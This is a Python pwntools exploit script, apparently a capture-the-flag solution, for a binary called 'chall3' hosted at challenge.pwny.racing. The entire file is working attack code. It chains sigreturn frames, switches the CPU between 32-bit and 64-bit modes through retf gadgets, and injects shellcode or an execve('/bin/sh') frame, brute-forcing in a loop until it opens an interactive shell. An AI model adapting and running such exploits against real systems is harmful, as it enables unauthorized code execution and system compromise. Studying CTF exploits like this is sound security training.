from pwn import *

context.log_level = 'warning'

if sys.argv[1] == '-r':
    local = 0
else:
    local = 1

if sys.argv[2] == '32':
    arch = 32
else:
    arch = 64

def bruteforce(t):
    while True:
        if t == 32:
            try:
                try_32('./chall3')
            except EOFError or BrokenPipeError:
                pass
        elif t == 64:
            try:
                try_64('./chall3')
            except EOFError or BrokenPipeError:
                pass

def try_32(binary):
    aaa = 0x400134
    int80 = 0x400137
    retf = 0x400139
    main_read = 0x4001a9
    main_syscall = 0x004001da
    binsh_stack = 0x6000418
    frame = SigreturnFrame(kernel='amd64')
    frame.eax = 0x7d
    frame.ebx = 0x6000000
    frame.ecx = 0x1000
    frame.edx = 0x7
    frame.eip = int80
    frame.ebp = binsh_stack+8
    frame.esp = binsh_stack+8
    frame.cs = 0x23
    sigret = bytes(frame)
    if local:
        p = process(binary)
    else:
        p = remote('challenge.pwny.racing',40003)
    # setting up ret to 64 bits
    seed = p32(main_read)
    seed += p32(0x33)
    buf = b'a'*0x20
    # match seed
    buf += p32(main_read)
    buf += p32(0x33)
    # return to 32 bits
    buf += p32(aaa)
    buf += b'c'*(0x100-len(buf))
    # setting up sigreturn syscall
    buf2 = b''
    buf2 += b'd'*0x18
    # return to shellcode
    buf2 += p32(0x60004d0)
    buf2 += p32(0x23)
    # match seed
    buf2 += p32(main_read)
    buf2 += p32(0x33)
    # return to 32 bits
    buf2 += p64(retf)
    buf2 += p64(0)
    # return to 64 bits
    buf2 += p32(main_read)
    buf2 += p32(0x33)
    # second part of sigreturn stack frame
    buf2 += b'f'*0x77
    buf2 += sigret[0x3f:]
    # shellcode
    buf2 += asm(shellcraft.i386.linux.sh())
    buf2 += b'g'*(0x100-len(buf2))
    buf3 = b''
    buf3 += b'e'*0x20
    # match seed
    buf3 += p32(main_read)
    buf3 += p32(0x33)
    # return to 32 bits
    buf3 += p64(int80)
    buf3 += p64(0x23)
    # first part of sigreturn stack frame
    buf3 += sigret[:0x3f]
    buf3 += b'h'*(0x77-len(buf3))
    p.send(seed)
    p.send(buf)
    p.send(buf2)
    try:
        p.send(buf3)
        p.sendline('echo rooted')
        log.warning(p.recvuntil('rooted'))
    except:
        return
    # open('32.txt','wb').write(seed+buf+buf2+buf3)
    p.interactive()
    exit()

def try_64(binary):
    aaa = 0x400134
    int80 = 0x400137
    retf = 0x400139
    main_read = 0x4001a9
    main_syscall = 0x004001da
    binsh_stack = 0x6000418
    frame = SigreturnFrame(kernel='amd64')
    frame.eax = 0x3b
    frame.edi = binsh_stack
    frame.esi = 0
    frame.edx = 0
    frame.eip = main_syscall
    frame.ebp = binsh_stack+8
    frame.esp = binsh_stack+8
    frame.cs = 0x33
    sigret = bytes(frame)
    if local:
        p = process(binary)
    else:
        p = remote('challenge.pwny.racing',40003)
    # setting up ret to 64 bits
    seed = p32(main_read)
    seed += p32(0x33)
    buf = b'a'*0x20
    # match seed
    buf += p32(main_read)
    buf += p32(0x33)
    # return to 32 bits
    buf += p32(aaa)
    buf += b'c'*(0x100-len(buf))
    # setting up sigreturn syscall
    buf2 = b''
    buf2 += b'd'*0x10
    buf2 += b'/bin/sh\x00'
    buf2 += b'd'*0x8
    # match seed
    buf2 += p32(main_read)
    buf2 += p32(0x33)
    # return to 32 bits
    buf2 += p64(retf)
    buf2 += p64(0)
    # return to 64 bits
    buf2 += p32(main_read)
    buf2 += p32(0x33)
    # second part of sigreturn stack frame
    buf2 += b'f'*0x77
    # buf2 += cyclic(0x50)[0x3f:].encode()
    buf2 += sigret[0x3f:]
    buf2 += b'g'*(0x100-len(buf2))
    buf3 = b''
    buf3 += b'd'*0x10
    buf3 += b'/bin/sh\x00'
    buf3 += b'd'*0x8
    # match seed
    buf3 += p32(main_read)
    buf3 += p32(0x33)
    # return to 32 bits
    buf3 += p64(int80)
    buf3 += p64(0x23)
    # first part of sigreturn stack frame
    # buf3 += cyclic(0x50)[:0x3f].encode()
    buf3 += sigret[:0x3f]
    buf3 += b'h'*(0x77-len(buf3))
    p.send(seed)
    p.send(buf)
    p.send(buf2)
    try:
        p.send(buf3)
        p.sendline('echo rooted')
        log.warning(p.recvuntil('rooted'))
    except:
        return
    # open('64.txt','wb').write(seed+buf+buf2+buf3)
    p.interactive()
    exit()

bruteforce(arch)
# try_64('./patched')
